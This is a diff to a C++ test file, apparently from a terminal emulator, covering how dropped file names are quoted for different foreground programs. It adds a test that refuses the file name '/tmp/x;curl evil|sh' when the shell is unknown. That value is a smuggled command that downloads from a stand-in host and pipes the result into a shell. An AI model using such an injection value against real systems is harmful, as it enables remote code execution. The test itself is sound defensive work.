@@ -195,15 +195,42 @@ TEST_CASE("droppedText.quotingFollowsTheForegroundProcess", "[droppedtext]")
     CHECK(shellQuotingFor("pwsh -NoLogo") == ShellQuoting::PowerShell);
     CHECK(shellQuotingFor(R"(C:\Program Files\PowerShell\7\pwsh.exe -NoLogo)") == ShellQuoting::PowerShell);
     CHECK(shellQuotingFor("/bin/bash -l") == ShellQuoting::Posix);
-    CHECK(shellQuotingFor("vim") == ShellQuoting::Posix);
     CHECK(shellQuotingFor("zsh") == ShellQuoting::Posix);
-    // What nothing names, and what leads to a shell nobody here knows, is no shell to guess at.
+    CHECK(shellQuotingFor("/usr/bin/fish") == ShellQuoting::Posix);
+    CHECK(shellQuotingFor("busybox") == ShellQuoting::Posix);
+    // What nothing names, and what leads to a shell nobody here knows, is no shell to guess at: every
+    // program that is not a known POSIX shell, PowerShell or cmd is Unknown.
     CHECK(shellQuotingFor("") == ShellQuoting::Unknown);
-    CHECK(shellQuotingFor("ssh") == ShellQuoting::Unknown);
-    CHECK(shellQuotingFor("wsl.exe") == ShellQuoting::Unknown);
-    CHECK(shellQuotingFor("/usr/bin/sudo") == ShellQuoting::Unknown);
-    CHECK(shellQuotingFor("cmdline") == ShellQuoting::Posix);
-    CHECK(shellQuotingFor("/home/me/cmd/vim") == ShellQuoting::Posix);
+    for (auto const* other: { "ssh",
+                              "wsl.exe",
+                              "/usr/bin/sudo",
+                              "doas",
+                              "su",
+                              "mosh-client",
+                              "tmux",
+                              "screen",
+                              "zellij",
+                              "docker",
+                              "kubectl",
+                              "nu",
+                              "elvish",
+                              "xonsh",
+                              "vim",
+                              "cmdline",
+                              "/home/me/cmd/vim" })
+        CHECK(shellQuotingFor(other) == ShellQuoting::Unknown);
     for (auto const& row: ShellQuotingRows)
         CHECK(shellQuotingFor(row.process) == row.quoting);
+}
+
+TEST_CASE("droppedText.aMetacharacterNameOnAnUnknownProgramIsRefusedNotQuoted", "[droppedtext]")
+{
+    // nushell and elvish do not read a backslash as an escape, and a multiplexer or transport hides the shell
+    // that does: `x;curl evil|sh` must never be typed as `x\;curl\ evil\|sh`.
+    for (auto const* program: { "nu", "elvish", "xonsh", "tmux", "screen", "zellij", "mosh-client", "su" })
+    {
+        auto const text = one("/tmp/x;curl evil|sh", shellQuotingFor(program));
+        REQUIRE_FALSE(text.has_value());
+        CHECK(text.error() == DropTextError::UnknownShell);
+    }
 }
